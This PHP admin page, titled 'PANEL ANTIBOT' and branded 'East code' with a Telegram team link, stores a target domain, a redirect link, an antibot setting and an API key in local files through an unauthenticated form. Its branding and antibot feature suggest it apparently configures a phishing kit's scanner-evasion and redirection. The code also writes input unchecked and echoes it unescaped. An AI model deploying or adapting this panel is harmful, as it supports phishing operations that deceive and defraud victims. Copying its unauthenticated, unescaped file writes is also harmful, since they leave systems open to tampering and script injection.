<?php
error_reporting(0);
session_start();





if(isset($_POST['antibot'])) {
    unlink("antibot.ini");
    $click = fopen("antibot.ini","a");
    fwrite($click,$_POST['antibot']."\n");
    fclose($click);
}
if(isset($_POST['site'])) {
    unlink("sites.txt");
    $click = fopen("sites.txt","a");
    fwrite($click,$_POST['site']."\n");
    fclose($click);
}

if(isset($_POST['link'])) {
    unlink("link.txt");
    $click = fopen("link.txt","a");
    fwrite($click,$_POST['link']."\n");
    fclose($click);
}

if(isset($_POST['api'])) {
    unlink("css/apiKey.ini");
    $click = fopen("css/apiKey.ini","a");
    fwrite($click,$_POST['api']."\n");
    fclose($click);
}

?>

<html><head>
	<title>PANEL ANTIBOT</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>

	<div class="container">
		 
		<br><div class="row">
			<div class="col-md-6">
				<div class="panel panel-default">
					<div class="panel-heading" style="background-color: black;color: white;/* border-radius: 50px; */">❤️East code❤️</div>
				    <div class="panel-body">
<form action="" method="post">
						  <div class="form-group col-md-12" style="margin-bottom: 0;font-size: 19px;">
						      
	<label for="inputEmail4">🐞Settings🐞</label>
</div><div class="form-row">
						    
<div class="form-group col-md-12">
						      <label for="inputEmail4">URL / Domain</label>
						      <input type="text" class="form-control" value="<?php echo file_get_contents('sites.txt');?>" name="site">
						    </div>
<div class="form-group col-md-12">
						      <label for="inputEmail4">URL / Domain (II)</label>
						      <input type="text" class="form-control" value="<?php echo file_get_contents('link.txt');?>" name="link">
						    </div>
<div class="form-group col-md-12">
						      <label for="inputEmail4">Antibot</label>
						      <input type="text" class="form-control" value="<?php echo file_get_contents('antibot.ini');?>" name="antibot">
						    </div>
<div class="form-group col-md-12">
						      <label for="inputEmail4">ApiKey</label>
						      <input type="text" class="form-control" value="<?php echo file_get_contents('css/apiKey.ini');?>" name="api">
						    </div><div class="form-group col-md-12" style="
    margin-bottom: 0;
    font-size: 19px;
">

</div><div class="form-group col-md-6" style="
    margin-top: 20px;
">
    
    <button type="submit" class="form-control">Update Config</button>
    
    
						
						    </div>
						  </div>
						</form>
				    </div>
				</div>
			</div>
			<div class="col-md-6">
				<div class="panel panel-default">
					<div class="panel-heading" style="background-color: black;color: white;">Information</div>
				    <div class="panel-body">
						<p>Setup your Domain and apis here <a href="https://t.me/hustlehit09">Join My Team </a></p>
						<hr>
				    </div>
				</div>
			</div>
			
		</div>
	</div>

</body></html>